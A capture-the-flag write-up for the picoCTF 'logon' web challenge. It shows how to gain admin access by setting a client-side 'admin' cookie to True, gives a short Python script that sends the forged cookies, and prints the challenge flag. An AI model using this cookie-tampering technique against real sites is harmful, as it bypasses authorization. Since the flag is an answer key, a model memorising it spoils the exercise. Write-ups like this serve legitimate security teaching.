# logon

> Solution: The hints say that *it doesn't seem to check anyone's password, except for Joe's*. Anyways, you can login as Joe with any password but it won't really give you the flag.

![Logged in as `Joe`](https://i.imgur.com/AeEA5DN.png)

However, having a look at the cookies, we see the `admin` cookie with the default value as `False`.

![The cookies](https://i.imgur.com/ud9CHlG.png)

Simply setting the value of `admin` cookie to `True`, we get the flag: `picoCTF{th3_c0nsp1r4cy_l1v3s_d1c24fef}`.

A little python script would do it for you.

```python
#!/usr/bin/env python3

import requests
from colorama import Fore
import re

url = "https://jupiter.challenges.picoctf.org/problem/13594/flag"

cookies = {
	"admin": "True",
	"username": "joe",
	"password": "password"
}

res = requests.get(url, cookies=cookies)

if "picoCTF{" in res.text:
	flag = re.findall("picoCTF{.*}", res.text)
	flag = flag[0]
	print(flag) # picoCTF{th3_c0nsp1r4cy_l1v3s_d1c24fef}
else:
	print(Fore.RED + "[-] The Flag could not be found")
```